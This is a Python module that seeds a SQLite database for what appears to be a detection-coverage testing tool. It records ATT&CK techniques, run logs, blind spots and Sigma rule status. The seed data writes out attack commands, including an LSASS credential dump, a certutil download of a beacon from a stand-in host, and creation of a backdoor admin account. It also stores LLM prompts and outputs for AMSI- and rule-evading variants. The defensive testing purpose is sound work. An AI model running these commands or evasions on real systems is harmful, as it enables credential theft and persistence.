import sqlite3
import json
import os
from typing import List, Dict, Any, Optional

DB_PATH = os.path.join(os.path.dirname(__file__), "detectiq.db")

def get_connection():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_connection()
    cur = conn.cursor()

    # Techniques table
    cur.execute("""
    CREATE TABLE IF NOT EXISTS techniques (
        id TEXT PRIMARY KEY,
        name TEXT NOT NULL,
        tactic TEXT NOT NULL,
        severity TEXT NOT NULL,
        description TEXT,
        default_payload TEXT
    )
    """)

    # Variations table
    cur.execute("""
    CREATE TABLE IF NOT EXISTS variations (
        id TEXT PRIMARY KEY,
        technique_id TEXT NOT NULL,
        method TEXT NOT NULL,
        description TEXT NOT NULL,
        status TEXT NOT NULL,
        source TEXT NOT NULL,
        llm_prompt TEXT,
        payload TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (technique_id) REFERENCES techniques (id)
    )
    """)

    # Execution Runs log table
    cur.execute("""
    CREATE TABLE IF NOT EXISTS runs_log (
        run_id TEXT PRIMARY KEY,
        technique_id TEXT NOT NULL,
        variant TEXT NOT NULL,
        variant_id TEXT,
        result TEXT NOT NULL,
        exec_ms INTEGER,
        sysmon_events INTEGER,
        eid1_count INTEGER DEFAULT 0,
        eid3_count INTEGER DEFAULT 0,
        eid11_count INTEGER DEFAULT 0,
        eid13_count INTEGER DEFAULT 0,
        command_line TEXT,
        parent_process TEXT,
        alert_generated INTEGER,
        detection_latency_sec REAL,
        ts TEXT NOT NULL,
        error TEXT,
        FOREIGN KEY (technique_id) REFERENCES techniques (id)
    )
    """)

    # Blind spots table
    cur.execute("""
    CREATE TABLE IF NOT EXISTS blind_spots (
        id TEXT PRIMARY KEY,
        technique_id TEXT NOT NULL,
        variant_id TEXT NOT NULL,
        status TEXT NOT NULL,
        cause TEXT NOT NULL,
        sigma_rule TEXT NOT NULL,
        recommendation TEXT NOT NULL,
        FOREIGN KEY (technique_id) REFERENCES techniques (id)
    )
    """)

    # Detection rules table
    cur.execute("""
    CREATE TABLE IF NOT EXISTS detection_rules (
        rule_file TEXT PRIMARY KEY,
        rule_name TEXT NOT NULL,
        technique_id TEXT NOT NULL,
        modified INTEGER NOT NULL DEFAULT 0,
        change_desc TEXT NOT NULL,
        benign_test TEXT NOT NULL,
        false_positive INTEGER NOT NULL DEFAULT 0
    )
    """)

    # Coverage matrix table (technique_id, variant_col, detected: 1, 0, or NULL)
    cur.execute("""
    CREATE TABLE IF NOT EXISTS coverage_matrix (
        technique_id TEXT NOT NULL,
        variant_col TEXT NOT NULL,
        detected INTEGER,
        PRIMARY KEY (technique_id, variant_col)
    )
    """)

    conn.commit()
    seed_data(conn)
    conn.close()

def seed_data(conn: sqlite3.Connection):
    cur = conn.cursor()

    cur.execute("SELECT COUNT(*) FROM techniques")
    if cur.fetchone()[0] > 0:
        return # Already seeded

    # Seed Techniques
    techniques_data = [
        ("T1059.001", "PowerShell", "Execution", "high",
         "Adversaries abuse PowerShell commands and scripts for code execution and lateral discovery.",
         "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command 'Get-Process -Name lsass'"),
        ("T1003.001", "LSASS Memory", "Credential Access", "critical",
         "Adversaries access credential material stored in the LSASS memory space.",
         "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 684 lsass.dmp full"),
        ("T1055.012", "Process Hollowing", "Defense Evasion", "critical",
         "Adversaries inject malicious payload into hollowed suspended target process.",
         "powershell.exe -ExecutionPolicy Bypass -File .\\inject_hollowing.ps1 -Target notepad.exe"),
        ("T1078", "Valid Accounts", "Initial Access", "high",
         "Adversaries obtain and abuse credentials of existing legitimate accounts.",
         "net use \\\\lab-dc01\\IPC$ /user:CORP\\Admin Password123!"),
        ("T1021.001", "Remote Desktop Protocol", "Lateral Movement", "medium",
         "Adversaries log into remote systems using RDP protocol.",
         "cmdkey /generic:TERMSRV/192.168.1.50 /user:Administrator /pass:Secret123"),
        ("T1027.002", "Software Packing", "Defense Evasion", "high",
         "Adversaries perform software packing to compress and obscure binary structure.",
         "upx.exe -9 -o agent_packed.exe agent_raw.exe"),
        ("T1082", "System Info Discovery", "Discovery", "low",
         "Adversaries attempt to query system information, OS build, and architecture.",
         "systeminfo.exe & whoami /all"),
        ("T1105", "Ingress Tool Transfer", "C&C", "high",
         "Adversaries transfer tools or payloads into compromised environments.",
         "certutil.exe -urlcache -split -f https://raw.payload.lab/beacon.bin %TEMP%\\beacon.exe"),
        ("T1569.002", "Service Execution", "Execution", "medium",
         "Adversaries abuse Windows service control manager to launch adversarial processes.",
         "sc.exe create TestSvc binPath= 'cmd.exe /c calc.exe' && sc.exe start TestSvc"),
        ("T1136.001", "Local Account Creation", "Persistence", "medium",
         "Adversaries create local accounts to maintain persistence on target hosts.",
         "net user backdoor_svc ComplexP@ss!99 /add && net localgroup administrators backdoor_svc /add")
    ]
    cur.executemany("INSERT INTO techniques VALUES (?, ?, ?, ?, ?, ?)", techniques_data)

    # Seed Variations
    variations_data = [
        ("VAR-AI-003", "T1059.001", "LLM", "IEX with split string concat to avoid keyword matching", "pending_review", "llm",
         "Generate a PowerShell execution variant that avoids AMSI detection using string concatenation only. No external downloads.",
         "powershell.exe -c \"$a='Invoke-Ex';$b='pression';&($a+$b) ('Write-'+'Host AMSI_TEST')\""),
        ("VAR-AI-002", "T1003.001", "LLM", "NanoDump via reflective load — alternate syscall chain", "approved", "llm",
         "Produce an LSASS dump variant using a reflective loader that avoids direct OpenProcess calls.",
         "rundll32.exe .\\nanodump.dll,MiniDump --fork"),
        ("VAR-MAN-007", "T1059.001", "Manual", "EncodedCommand flag with Base64 payload", "approved", "manual",
         None,
         "powershell.exe -EncodedCommand V3JpdGUtT3V0cHV0ICdBZG1pbiBFeGVjdXRpb24n"),
        ("VAR-MAN-006", "T1003.001", "Manual", "comsvcs.dll MiniDump via rundll32", "approved", "manual",
         None,
         "rundll32.exe C:\\windows\\system32\\comsvcs.dll, #24 712 lsass.dmp full"),
        ("VAR-AI-001", "T1078", "LLM", "RDP auth with renamed built-in account — rule only checks 'Admin'", "rejected", "llm",
         "Vary the account name used in a valid-accounts RDP login to evade name-based rules.",
         "cmdkey /generic:TERMSRV/192.168.1.50 /user:backup_operator /pass:Secret123"),
    ]
    cur.executemany("INSERT INTO variations VALUES (?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)", variations_data)

    # Seed Runs Log
    runs_data = [
        ("RUN-041", "T1059.001", "Base", None, "ALERT", 1240, 14, 4, 0, 2, 8, "powershell.exe -NoProfile -Command 'Get-Process'", "cmd.exe", 1, 1.24, "2026-09-04 14:33:11", None),
        ("RUN-040", "T1059.001", "VAR-3 (Encoded)", "VAR-MAN-007", "NO_ALERT", 980, 7, 2, 0, 1, 4, "powershell.exe -EncodedCommand V3JpdGU...", "explorer.exe", 0, None, "2026-09-04 14:32:58", None),
        ("RUN-039", "T1003.001", "VAR-2 (Minidump)", "VAR-MAN-006", "NO_ALERT", 2310, 22, 3, 0, 12, 7, "rundll32.exe comsvcs.dll #24", "cmd.exe", 0, None, "2026-09-04 14:30:22", None),
        ("RUN-038", "T1078", "Base", None, "ALERT", 830, 9, 2, 3, 0, 4, "net use \\\\lab-dc01 /user:Administrator", "services.exe", 1, 0.83, "2026-09-04 14:28:05", None),
        ("RUN-037", "T1082", "Base", None, "ALERT", 420, 5, 2, 0, 1, 2, "systeminfo.exe & whoami", "cmd.exe", 1, 0.42, "2026-09-04 14:25:44", None),
        ("RUN-036", "T1055.012", "VAR-1", None, "NO_ALERT", 1870, 18, 5, 1, 0, 12, "inject_hollowing.ps1 -Target notepad.exe", "powershell.exe", 0, None, "2026-09-04 14:22:01", None),
    ]
    cur.executemany("INSERT INTO runs_log VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", runs_data)

    # Seed Blindspots
    blindspots_data = [
        ("BS-004", "T1003.001", "VAR-MAN-006", "open",
         "Rule matches direct sekurlsa::logonpasswords. comsvcs.dll MiniDump uses different call path.",
         "sigma/cred_dump_lsass_direct.yml",
         "Add parent-process rule matching rundll32 -> comsvcs.dll with MiniDump export."),
        ("BS-003", "T1059.001", "VAR-MAN-007", "patched",
         "Rule requires raw invocation pattern; -EncodedCommand bypasses string match.",
         "sigma/powershell_exec.yml",
         "Match on EncodedCommand flag regardless of payload content. Rule updated."),
        ("BS-002", "T1055.012", "VAR-1", "open",
         "No detection rule exists. Sysmon Event ID 10 fires but no sigma rule consumes it.",
         "—",
         "Author new rule on Sysmon EID 10 with hollow process memory-write heuristic."),
        ("BS-001", "T1027.002", "VAR-1", "open",
         "Signature-based rule misses packed binaries with modified UPX headers.",
         "sigma/suspicious_packed_binary.yml",
         "Supplement signature rule with entropy-based heuristic detection.")
    ]
    cur.executemany("INSERT INTO blind_spots VALUES (?, ?, ?, ?, ?, ?, ?)", blindspots_data)

    # Seed Detection Rules
    rules_data = [
        ("sigma/powershell_exec.yml", "PowerShell Suspicious Invocation", "T1059.001", 1, "Added EncodedCommand pattern", "Normal PS scripts", 0),
        ("sigma/cred_dump_lsass_direct.yml", "Direct LSASS Memory Access", "T1003.001", 0, "Pending — add comsvcs parent rule", "Windows Update", 0),
        ("sigma/suspicious_packed_binary.yml", "Packed Binary UPX Signature", "T1027.002", 0, "Pending — add entropy heuristic", "AV engine scan", 0),
        ("sigma/process_hollowing.yml", "Process Hollowing Memory Injection", "T1055.012", 0, "New — in development", "Browser launch", 1)
    ]
    cur.executemany("INSERT INTO detection_rules VALUES (?, ?, ?, ?, ?, ?, ?)", rules_data)

    # Seed Coverage Matrix
    cols = ["Base", "VAR-1", "VAR-2", "VAR-3", "VAR-4"]
    matrix_seed = {
        "T1059.001": [1,  1,  0, 0, None],
        "T1003.001": [1,  1,  0, None, None],
        "T1055.012": [0,  0,  0, None, None],
        "T1078":     [1,  0,  None, None, None],
        "T1021.001": [1,  1,  1, None, None],
        "T1027.002": [0,  0,  0, 0, None],
        "T1082":     [1,  1,  None, None, None],
        "T1105":     [1,  1,  0, None, None],
        "T1569.002": [0,  0,  None, None, None],
        "T1136.001": [1,  0,  None, None, None],
    }
    for tech_id, vals in matrix_seed.items():
        for i, val in enumerate(vals):
            cur.execute("INSERT INTO coverage_matrix VALUES (?, ?, ?)", (tech_id, cols[i], val))

    conn.commit()

